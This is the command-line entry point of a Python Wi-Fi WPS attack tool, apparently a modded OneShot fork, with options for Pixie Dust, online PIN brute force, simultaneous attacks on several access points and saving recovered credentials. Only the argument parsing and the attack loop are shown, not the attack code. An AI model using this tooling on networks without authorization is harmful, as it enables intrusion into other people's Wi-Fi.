if __name__ == '__main__':
    parser = argparse.ArgumentParser(
        description='trieupham 0.0.3 (c) 2023 rofl0r, drygdryg modded by vladimir127001, enhanced by Grok',
        epilog='Example: %(prog)s -i wlan0 -b 00:90:4C:C1:AC:21 -K --threads 4 --multi-ap --gui'
    )

    parser.add_argument('-i', '--interface', type=str, required=True, help='Name of the interface to use')
    parser.add_argument('-b', '--bssid', type=str, help='BSSID of the target AP')
    parser.add_argument('-p', '--pin', type=str, help='Use the specified pin (arbitrary string or 4/8 digit pin)')
    parser.add_argument('-K', '--pixie-dust', action='store_true', help='Run Pixie Dust attack')
    parser.add_argument('-F', '--pixie-force', action='store_true', help='Run Pixiewps with --force option (bruteforce full range)')
    parser.add_argument('-X', '--show-pixie-cmd', action='store_true', help='Always print Pixiewps command')
    parser.add_argument('-B', '--bruteforce', action='store_true', help='Run online bruteforce attack')
    parser.add_argument('--pbc', '--push-button-connect', action='store_true', help='Run WPS push button connection')
    parser.add_argument('-d', '--delay', type=float, help='Set the delay between pin attempts')
    parser.add_argument('-w', '--write', action='store_true', help='Write credentials to the file on success')
    parser.add_argument('--iface-down', action='store_true', help='Down network interface when the work is finished')
    parser.add_argument('--vuln-list', type=str, default=os.path.dirname(os.path.realpath(__file__)) + '/vulnlist.txt',
                        help='Use custom file with vulnerable devices list')
    parser.add_argument('-l', '--loop', action='store_true', help='Run in a loop')
    parser.add_argument('-r', '--reverse-scan', action='store_true', help='Reverse order of networks in the list of networks')
    parser.add_argument('--mtk-wifi', action='store_true',
                        help='Activate MediaTek Wi-Fi interface driver on startup and deactivate it on exit')
    parser.add_argument('-v', '--verbose', action='store_true', help='Verbose output')
    parser.add_argument('--threads', type=int, default=1, help='Number of threads for bruteforce (default: 1)')
    parser.add_argument('--multi-ap', action='store_true', help='Attack multiple APs simultaneously (up to 3 targets)')
    parser.add_argument('--gui', action='store_true', help='Use GUI notifications via termux-toast')
    parser.add_argument('--battery-threshold', type=int, default=20, help='Minimum battery percentage to continue (default: 20)')
    parser.add_argument('--max-attempts', type=int, default=5, help='Maximum failed attempts before skipping an AP (default: 5)')

    args = parser.parse_args()

    if sys.hexversion < 0x03060F0:
        die("The program requires Python 3.6 and above")
    if os.getuid() != 0:
        die("Run it as root")

    if args.mtk_wifi:
        wmtWifi_device = Path("/dev/wmtWifi")
        if not wmtWifi_device.is_char_device():
            die("Unable to activate MediaTek Wi-Fi interface device (--mtk-wifi): "
                "/dev/wmtWifi does not exist or it is not a character device")
        wmtWifi_device.chmod(0o644)
        wmtWifi_device.write_text("1")

    if not ifaceUp(args.interface):
        die(f'Unable to up interface "{args.interface}"')

    companion = None
    try:
        while True:
            try:
                companion = Companion(args.interface, args.write, print_debug=args.verbose, threads=args.threads,
                                      battery_threshold=args.battery_threshold, max_attempts=args.max_attempts, use_gui=args.gui)
                if args.pbc:
                    companion.single_connection(pbc_mode=True)
                else:
                    if not args.bssid:
                        try:
                            with open(args.vuln_list, 'r', encoding='utf-8') as file:
                                vuln_list = file.read().splitlines()
                        except FileNotFoundError:
                            vuln_list = []
                        scanner = WiFiScanner(args.interface, vuln_list)
                        if not args.loop:
                            print('[*] BSSID not specified (--bssid) — scanning for available networks')
                        if args.multi_ap:
                            bssids = scanner.prompt_network(multi_ap=True, max_targets=3)
                        else:
                            bssids = [scanner.prompt_network()]
                    else:
                        bssids = [args.bssid]

                    if bssids:
                        companion = Companion(args.interface, args.write, print_debug=args.verbose, threads=args.threads,
                                              battery_threshold=args.battery_threshold, max_attempts=args.max_attempts, use_gui=args.gui)
                        if args.multi_ap:
                            companion.attack_multi_ap(bssids, args.pixie_dust, args.show_pixie_cmd, args.pixie_force)
                        elif args.bruteforce:
                            companion.smart_bruteforce(bssids[0], args.pin, args.delay, args.threads)
                        else:
                            companion.single_connection(bssids[0], args.pin, args.pixie_dust,
                                                        args.show_pixie_cmd, args.pixie_force)
                if not args.loop:
                    break
                args.bssid = None
            except KeyboardInterrupt:
                print("\n[!] Aborted by user")
                if args.loop:
                    choice = input("\n[?] Exit the script (otherwise continue to AP scan)? [N/y] ").lower()
                    if choice == 'y':
                        print("Exiting…")
                        break
                    args.bssid = None
                    continue
                else:
                    print("Exiting…")
                    break
    finally:
        if companion:
            companion.cleanup()

    if args.iface_down:
        ifaceUp(args.interface, down=True)

    if args.mtk_wifi:
        wmtWifi_device.write_text("0")
